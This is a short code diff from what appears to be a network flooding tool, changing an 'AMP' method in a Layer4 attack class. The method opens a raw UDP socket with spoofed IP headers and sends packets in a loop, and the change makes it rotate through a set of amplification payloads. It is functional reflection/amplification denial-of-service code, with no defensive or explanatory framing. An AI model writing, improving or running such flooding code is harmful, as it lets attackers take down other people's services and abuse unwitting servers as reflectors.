@@ -472,12 +472,11 @@ class Layer4(Thread):
         Tools.safe_close(s)
 
     def AMP(self) -> None:
-        payload = next(self._amp_payloads)
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_RAW,
                                          IPPROTO_UDP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            while Tools.sendto(s, *payload):
+            while Tools.sendto(s, *next(self._amp_payloads)):
                 continue
         Tools.safe_close(s)
 
